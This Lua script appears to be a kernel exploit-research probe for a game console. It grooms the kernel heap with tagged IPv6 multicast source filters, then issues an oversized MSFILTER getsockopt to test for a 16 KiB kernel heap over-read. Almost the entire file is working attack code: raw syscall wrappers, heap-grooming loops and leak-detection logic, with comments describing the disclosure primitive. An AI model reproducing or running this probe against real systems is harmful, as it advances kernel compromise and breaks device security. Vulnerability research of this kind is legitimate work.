-- CRASH_CLASS: MODERATE
-- PROBE 1429a: is the caller-sized MSFILTER readback a kernel heap over-read?
--
-- 1428a measured the copy length: getsockopt(41,74) with claim=0 writes 0 bytes,
-- claim=1 writes 128 bytes, claim=128 writes 16384 bytes -- on a group that
-- really has ONE source. So the copy length is the caller's numsrc, not the
-- in6_multi's real count (the returned header still carries the true count).
--
-- Two hypotheses produce that:
--   H1 the kernel zero-fills to the caller's length (harmless)
--   H2 the kernel copies numsrc*128 bytes out of an in6_multi source array that
--      was allocated for the real count -> reads whatever the kernel heap holds
--      past that array. With a groom that puts recognisable bytes in the
--      neighbouring 128-byte objects, H2 becomes visible and the primitive is a
--      16 KiB kernel heap disclosure with no credential gate.
--
-- Groom: many groups, each with exactly one source whose address tag is unique.
-- Every group allocates a 128-byte filter array from the same kmalloc bucket, so
-- a 16 KiB read from one of them should walk over its siblings and their tags
-- must appear in the output if H2 holds.
--
-- Prior art:
--   1427a results/phase36_realargs/1427a_msfilter_readback_20261109_162242.txt
--       128 sources accepted, 129 ENOSPC(55); per-group readback, no aliasing
--   1428a .../1428a_msfilter_readback_count_20261109_162635.txt
--       claim=1 -> 32 dwords, claim=128 -> 4096 dwords, claim=0 -> 0 dwords
--   50f results/phase11_network_attacks/50f_ipv6_msfilter_aligned_20261022_183727.txt
--   docs/CVE-2026-49412-PS5-14.10.md

print("=== PROBE 1429a: MSFILTER OVER-READ TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function z(p, n) for i = 0, n - 1 do memory.write_byte(p + i, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local function rd(p, i) return to_num(memory.read_dword(p + i)) end

local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41
local JOIN, LEAVE, MSFILTER = 12, 13, 74
local socket, getsockopt, setsockopt = sc(97), sc(118), sc(105)
local getpid = sc(20)

local function map(len, prot)
    local va = to_num(sc(477)(uint64(0), uint64(len), uint64(prot or 3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end

local req = memory.alloc(0x100)
local glen = memory.alloc(16)
local DSTLEN = 0x800000                       -- 8 MiB, survives a claim of 0x4000
local src = map(0x8000)
local dst = map(DSTLEN)
assert(src and dst, "mmap failed")

local function newsock()
    local fd = to_num(socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 or fd > 4096 then return nil end
    return fd
end

local function join(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(JOIN), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end
local function leave(fd, tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -1
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(LEAVE), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end

local function prep(tag, mode, nsrc, sa)
    z(req, 160)
    d(req, 0, 1)
    d(req, 4, mode)
    d(req, 8, nsrc)
    b(req, 16, 28)
    b(req, 17, AF_INET6)
    b(req, 24, 0xff); b(req, 25, 0x02); b(req, 39, tag)
    d(req, 16 + 24, 1)
    memory.write_qword(req + 144, uint64(sa or 0))
end

-- one source, address 2001::<hi><lo>, so every group's array is recognisable
local function fill_one(n, hi, lo)
    local cap = n > 0 and n or 1
    z(src, cap * 128)
    for i = 0, cap - 1 do
        local e = src + i * 128
        b(e, 0, 28)
        b(e, 1, AF_INET6)
        b(e, 8, 0x20); b(e, 9, 0x01)
        b(e, 22, hi)
        b(e, 23, (lo + i) % 256)
        d(e, 24, 1)
    end
end

local function set_filter(fd, tag, n, hi, lo)
    fill_one(n, hi, lo)
    prep(tag, 1, n, src)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(152), uint64(0))
    end)
    if ok then rv = to_num(r) end
    return rv
end

local function fill_dst(dwords)
    for i = 0, dwords - 1 do memory.write_dword(dst + i * 4, 0xA5A5A5A5) end
end

-- read back with an explicit claim; returns rv, real numsrc, dwords written,
-- count of nonzero dwords past the first 128 bytes, first such offset
local function get_filter(fd, tag, claim)
    prep(tag, 1, claim, dst)
    local scan = claim * 32
    if scan > 16384 then scan = 16384 end          -- bound the scan cost
    if scan < 32 then scan = 32 end
    fill_dst(scan)
    d(glen, 0, 152)
    local rv = -999
    local ok, r = pcall(function()
        return getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(glen), uint64(0))
    end)
    if ok then rv = to_num(r) end
    local got = rd(req, 8)
    local wrote, nz, firstnz = 0, 0, -1
    for i = 0, scan - 1 do
        if rd(dst, i * 4) ~= 0xA5A5A5A5 then wrote = wrote + 1 end
    end
    for i = 32, scan - 1 do                        -- past the first 128 bytes
        if rd(dst, i * 4) ~= 0 and rd(dst, i * 4) ~= 0xA5A5A5A5 then
            nz = nz + 1
            if firstnz < 0 then firstnz = i end
        end
    end
    return rv, got, wrote, nz, firstnz
end

local pid = to_num(getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("pid=%d src=0x%X dst=0x%X dstlen=0x%X", pid, src, dst, DSTLEN))
print("")

-- ---------------------------------------------------------------------
print("[A] groom: many 1-source groups, each with a unique source tag")
local fdG = newsock()
assert(fdG, "no socket")
local GROUPS = 64
local joined, setok = 0, 0
local tags = {}
for i = 0, GROUPS - 1 do
    local tag = 0x10 + i
    if join(fdG, tag) == 0 then
        joined = joined + 1
        if set_filter(fdG, tag, 1, 0x40 + math.floor(i / 256), i % 256) == 0 then
            setok = setok + 1
        end
        tags[i] = tag
    end
end
print(string.format("  joined=%d/%d  filters set=%d", joined, GROUPS, setok))

-- ---------------------------------------------------------------------
print("")
print("[B] baseline on group tag 0x10: claim=1")
do
    local rv, got, wrote, nz, f = get_filter(fdG, 0x10, 1)
    print(string.format("  claim=1  rv=%d numsrc=%d wrote=%d past-entry0-nonzero=%d", rv, got, wrote, nz))
end

print("")
print("[C] the same group, claim=128 -> 16 KiB copied out of a 128-byte array")
do
    local rv, got, wrote, nz, f = get_filter(fdG, 0x10, 128)
    print(string.format("  claim=128 rv=%d numsrc=%d wrote=%d past-entry0-nonzero=%d first=%d",
        rv, got, wrote, nz, f))
    if nz > 0 then
        print(string.format("    entry1 dwords: %08X %08X %08X %08X",
            rd(dst, 128), rd(dst, 132), rd(dst, 136), rd(dst, 140)))
        print(string.format("    entry2 dwords: %08X %08X %08X %08X",
            rd(dst, 256), rd(dst, 260), rd(dst, 264), rd(dst, 268)))
        print("  >>> OVER-READ: memory past the real filter array reached userland")
    else
        print("  -> nothing but the real entry: either zero-fill or zeroed neighbours")
    end
end

-- ---------------------------------------------------------------------
print("")
print("[D] does the same over-read see a sibling group's source tag?")
do
    -- every sibling entry 0 starts with 1C1C (ss_len, AF_INET6); a sibling's
    -- unique tag is at offset 22 of its entry, so scan for 0x1C1C0000-shaped
    -- first dwords at 128-byte stride as well as for any 0x40xx byte at +23
    local found, at = 0, -1
    for e = 1, 127 do
        local w = rd(dst, e * 128)
        if w == 0x00001C1C then
            found = found + 1
            if at < 0 then at = e end
        end
    end
    print(string.format("  entries with a valid sockaddr header past entry0: %d (first=%d)", found, at))
    if found > 0 then
        print("  >>> SIBLING ARRAYS: the read walks neighbouring kernel objects")
    end
end

-- ---------------------------------------------------------------------
print("")
print("[E] is the claim itself bounded? (setsockopt stopped at 128 with ENOSPC)")
for _, c in ipairs({ 129, 256, 1024, 4096, 0x4000 }) do
    local rv, got, wrote, nz = get_filter(fdG, 0x10, c)
    print(string.format("  claim=%-6d rv=%d numsrc=%d wrote=%d (bytes=%d) errno=%s",
        c, rv, got, wrote, wrote * 4, es()))
end

print("")
print("=== PROBE 1429a COMPLETE ===")
